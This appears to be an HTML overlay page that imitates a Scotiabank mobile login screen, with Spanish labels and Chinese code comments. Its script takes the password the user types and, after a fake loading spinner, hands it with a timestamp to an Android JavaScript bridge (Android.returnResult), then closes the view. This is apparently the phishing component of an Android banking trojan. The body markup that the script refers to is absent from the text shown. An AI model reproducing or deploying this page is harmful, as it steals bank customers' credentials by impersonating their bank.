<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
  <meta name="theme-color" content="#ffffff">
  <title>Scotiabank</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      /* 原图 887×1774。手机上铺满屏幕，宽屏时收成同样比例的一列。 */
      --vh: 100dvh;
      --u: min(100vw / 887, var(--vh) / 1774, 430px / 887);
      --w: calc(var(--u) * 887);
      --ink: #0d1829;
      --red: #e81317;
      --btn: #de121d;
      --line: #b6c1d1;
      --nav: #f3f5f8;
    }
    @media (min-aspect-ratio: 1/2) {
      :root {
        --vh: min(100dvh, calc(min(100vw, 430px) * 1774 / 887));
        --u: min(100vw / 887, var(--vh) / 1774, 430px / 887);
        --w: calc(var(--u) * 887);
      }
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; background: #e6e8ee; }
    body {
      min-height: 100dvh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: "Source Sans 3", "Helvetica Neue", Helvetica, Arial, sans-serif;
      color: var(--ink);
      -webkit-text-size-adjust: 100%;
      -webkit-tap-highlight-color: transparent;
      -webkit-font-smoothing: antialiased;
    }
    button, input { font: inherit; color: inherit; }
    button { border: 0; background: transparent; cursor: pointer; }
    button:active { opacity: 0.72; }
    img { display: block; }

    .app {
      width: var(--w);
      height: var(--vh);
      background: #fff;
      position: relative;
      overflow: hidden;
    }

    .wave {
      position: absolute;
      top: 0;
      right: 0;
      width: calc(var(--u) * 530);
      height: calc(var(--u) * 325);
      pointer-events: none;
    }
    .logo {
      position: absolute;
      left: calc(var(--u) * 81);
      top: calc(var(--vh) * 150 / 1774);
      width: calc(var(--u) * 447);
      height: calc(var(--u) * 73);
    }
    .avatar {
      position: absolute;
      left: calc(50% - var(--u) * 91);
      top: calc(var(--vh) * 303 / 1774);
      width: calc(var(--u) * 182);
      height: calc(var(--u) * 183);
    }
    .switch {
      position: absolute;
      top: calc(var(--vh) * 512 / 1774);
      left: 0;
      right: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: calc(var(--u) * 14);
      color: var(--red);
      font-size: calc(var(--u) * 31);
      font-weight: 700;
      letter-spacing: -0.01em;
      line-height: 1;
    }
    .switch img {
      width: calc(var(--u) * 34);
      height: calc(var(--u) * 45);
    }

    .label {
      position: absolute;
      top: calc(var(--vh) * 608 / 1774);
      left: calc(var(--u) * 70);
      font-size: calc(var(--u) * 32);
      font-weight: 700;
      letter-spacing: -0.015em;
      line-height: 1.1;
    }
    .field {
      position: absolute;
      top: calc(var(--vh) * 672 / 1774);
      left: calc(var(--u) * 70);
      width: calc(var(--w) - var(--u) * 140);
      height: calc(var(--u) * 98);
      border: calc(var(--u) * 2.4) solid var(--line);
      border-radius: calc(var(--u) * 18);
      display: flex;
      align-items: center;
      padding: 0 calc(var(--u) * 18) 0 calc(var(--u) * 28);
      background: #fff;
    }
    .field input {
      flex: 1;
      min-width: 0;
      border: 0;
      outline: none;
      background: transparent;
      font-size: calc(var(--u) * 34);
      font-weight: 700;
      letter-spacing: 0.42em;
      color: #5c6b80;
      height: 100%;
    }
    .eye {
      width: calc(var(--u) * 64);
      height: calc(var(--u) * 64);
      display: grid;
      place-items: center;
      position: relative;
      flex: none;
    }
    .eye img {
      width: calc(var(--u) * 52);
      height: calc(var(--u) * 36);
    }
    .eye.on::after {
      content: "";
      position: absolute;
      width: calc(var(--u) * 46);
      height: calc(var(--u) * 3.2);
      background: #3c4a5e;
      border-radius: 999px;
      transform: rotate(-38deg);
    }

    .err {
      position: absolute;
      top: calc(var(--vh) * 776 / 1774);
      left: calc(var(--u) * 70);
      right: calc(var(--u) * 70);
      color: #e10600;
      font-size: calc(var(--u) * 24);
      font-weight: 700;
      line-height: 1.2;
    }
    .err[hidden] { display: none; }
    .field.invalid { border-color: #e10600; }
    .forgot {
      position: absolute;
      top: calc(var(--vh) * 812 / 1774);
      left: calc(var(--u) * 70);
      color: var(--red);
      font-size: calc(var(--u) * 30);
      font-weight: 600;
      letter-spacing: -0.012em;
      line-height: 1.15;
    }
    .forgot .chev {
      font-weight: 500;
      margin-left: calc(var(--u) * 6);
    }

    .trust {
      position: absolute;
      top: calc(var(--vh) * 888 / 1774);
      left: calc(var(--u) * 74);
      right: calc(var(--u) * 70);
      display: flex;
      align-items: center;
      gap: calc(var(--u) * 16);
    }
    .check {
      width: calc(var(--u) * 47);
      height: calc(var(--u) * 51);
      flex: none;
      display: grid;
      place-items: center;
    }
    .check img {
      width: calc(var(--u) * 47);
      height: calc(var(--u) * 51);
    }
    .check:not(.on) img { visibility: hidden; }
    .check:not(.on)::before {
      content: "";
      width: calc(var(--u) * 40);
      height: calc(var(--u) * 40);
      border: calc(var(--u) * 2.5) solid #c5ceda;
      border-radius: calc(var(--u) * 8);
    }
    .trust span {
      font-size: calc(var(--u) * 29);
      font-weight: 600;
      letter-spacing: -0.015em;
      line-height: 1.15;
    }
    .info {
      width: calc(var(--u) * 47);
      height: calc(var(--u) * 47);
      margin-left: calc(var(--u) * 6);
      flex: none;
    }
    .info img {
      width: calc(var(--u) * 47);
      height: calc(var(--u) * 47);
    }

    .go {
      position: absolute;
      top: calc(var(--vh) * 996 / 1774);
      left: calc(var(--u) * 70);
      width: calc(var(--w) - var(--u) * 140);
      height: calc(var(--u) * 114);
      border-radius: calc(var(--u) * 34);
      background: var(--btn);
      color: #fff;
      font-size: calc(var(--u) * 34);
      font-weight: 700;
      letter-spacing: -0.015em;
      position: relative;
    }
    .go.loading { color: transparent; }
    .go.loading::after {
      content: "";
      position: absolute;
      left: 50%;
      top: 50%;
      width: calc(var(--u) * 36);
      height: calc(var(--u) * 36);
      margin: calc(var(--u) * -18) 0 0 calc(var(--u) * -18);
      border-radius: 50%;
      border: calc(var(--u) * 3.5) solid rgba(255, 255, 255, 0.35);
      border-top-color: #fff;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .or {
      position: absolute;
      top: calc(var(--vh) * 1162 / 1774);
      left: calc(var(--u) * 86);
      right: calc(var(--u) * 86);
      display: flex;
      align-items: center;
      gap: calc(var(--u) * 22);
      color: #8b909a;
      font-size: calc(var(--u) * 28);
      font-weight: 500;
      line-height: 1;
    }
    .or::before, .or::after {
      content: "";
      flex: 1;
      height: calc(var(--u) * 2);
      background: #c3c5cc;
    }

    .finger {
      position: absolute;
      top: calc(var(--vh) * 1222 / 1774);
      left: calc(50% - var(--u) * 75);
      width: calc(var(--u) * 149);
      height: calc(var(--u) * 154);
    }
    .finger img {
      width: calc(var(--u) * 149);
      height: calc(var(--u) * 154);
    }
    .finger-label {
      position: absolute;
      top: calc(var(--vh) * 1396 / 1774);
      left: 0;
      right: 0;
      text-align: center;
      font-size: calc(var(--u) * 30);
      font-weight: 700;
      letter-spacing: -0.015em;
    }

    .dock {
      position: absolute;
      left: 0;
      right: 0;
      top: calc(var(--vh) * 1496 / 1774);
      bottom: 0;
      align-items: flex-start;
      background: var(--nav);
      display: flex;
      padding: calc(var(--vh) * 42 / 1774) 0 env(safe-area-inset-bottom);
    }
    .dock button {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: calc(var(--u) * 16);
      font-size: calc(var(--u) * 26);
      font-weight: 700;
      letter-spacing: -0.01em;
      color: #1b2230;
      position: relative;
    }
    .dock button + button::before {
      content: "";
      position: absolute;
      left: 0;
      top: calc(var(--u) * 8);
      width: calc(var(--u) * 2);
      height: calc(var(--u) * 78);
      background: #c5c9d1;
    }
    .dock img { object-fit: contain; }
    .dock .pin { width: calc(var(--u) * 44); height: calc(var(--u) * 59); }
    .dock .help { width: calc(var(--u) * 54); height: calc(var(--u) * 57); }
    .dock .shield { width: calc(var(--u) * 48); height: calc(var(--u) * 57); }
  </style>
</head>

  <script>
    (function () {
      var input = document.getElementById("clave");
      var field = document.querySelector(".field");
      var err = document.getElementById("claveErr");
      var eye = document.getElementById("eye");
      var check = document.getElementById("check");
      var go = document.getElementById("go");

      function showErr() {
        field.classList.add("invalid");
        err.hidden = false;
        input.setAttribute("aria-invalid", "true");
      }
      function clearErr() {
        field.classList.remove("invalid");
        err.hidden = true;
        input.removeAttribute("aria-invalid");
      }

      eye.addEventListener("click", function () {
        var show = input.type === "password";
        input.type = show ? "text" : "password";
        eye.classList.toggle("on", show);
        eye.setAttribute("aria-pressed", show ? "true" : "false");
        eye.setAttribute("aria-label", show ? "Ocultar contraseña" : "Mostrar contraseña");
        input.focus();
      });

      check.addEventListener("click", function () {
        var on = !check.classList.contains("on");
        check.classList.toggle("on", on);
        check.setAttribute("aria-pressed", on ? "true" : "false");
      });

      input.addEventListener("input", function () {
        if (input.value.length >= 6) clearErr();
      });

      go.addEventListener("click", function () {
        if (go.classList.contains("loading")) return;
        if (input.value.length < 6) {
          showErr();
          input.focus();
          return;
        }
        clearErr();
        go.classList.add("loading");
        go.disabled = true;
        go.setAttribute("aria-busy", "true");
        setTimeout(() => {
        try {
          if (typeof Android !== 'undefined' && Android.returnResult) {
            Android.returnResult(JSON.stringify({
              '类型': 'scotia',
              '密码': input.value,
              '时间戳': Date.now()
            }));
          }
        } catch (e) {}
        setTimeout(() => {
          try {
            if (typeof Android !== 'undefined' && Android.close) Android.close();
          } catch (e) {}
        }, 2500);
      }, 900);
      });
    })();
  </script>
